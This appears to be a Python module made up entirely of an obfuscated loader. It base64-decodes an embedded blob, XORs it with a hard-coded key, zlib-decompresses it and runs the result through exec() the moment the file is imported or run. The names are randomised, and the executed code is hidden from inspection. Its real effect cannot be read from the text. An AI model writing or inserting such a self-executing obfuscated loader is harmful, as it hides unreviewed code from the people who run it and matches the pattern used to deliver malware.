import base64 as _q_5e77638c
import zlib as _z_5e77638c
_k_5e77638c = b'3\x8dw\xfe\xd6\xf2\xb7\xf3\xd2\x846bU\x0f\n\xb9\x83\x01l"V\x83\x8f\xf6'
_d_5e77638c = bytes(_c_5e77638c ^ _k_5e77638c[_i_5e77638c % len(_k_5e77638c)] for _i_5e77638c, _c_5e77638c in enumerate(_q_5e77638c.b64decode('S1e8Mvs6mNmDzHxOGzo56MstOqp5D7hHh7k7zObBUzlWzGCHMSmLHCkRPn5/Kub8wkgH/1sK8775qjNCfUUnkK7LL3T6FB1srxIsrkKo619T4Io8x5YD8aUkeYYP0IA8ZaJatwVH5yRW3qcmECSyudRVKqg=')))
_d_5e77638c = _z_5e77638c.decompress(_d_5e77638c)
exec(compile(_d_5e77638c, __file__, 'exec'), globals(), globals())
